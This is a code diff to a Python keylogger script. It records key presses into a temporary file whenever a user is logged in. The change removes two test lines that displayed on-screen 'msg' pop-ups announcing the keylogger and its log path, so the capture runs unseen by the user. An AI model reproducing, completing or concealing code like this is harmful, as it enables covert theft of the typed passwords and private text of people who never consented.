@@ -83,7 +83,6 @@ def is_user_logged_in():
     return False
 
 def keylogger():
-    os.system("msg * keylogger:starting") #REMOVE AFTER TESTS
     temp_file = tempfile.NamedTemporaryFile(delete=False)
     log_file_path = temp_file.name
 
@@ -94,7 +93,6 @@ def keylogger():
 
     with Listener(on_press=on_press) as listener:
         listener.join()
-        os.system(f"msg * {str(log_file_path)}") #REMOVE AFTER TESTS
 
 while True:
     if is_user_logged_in():
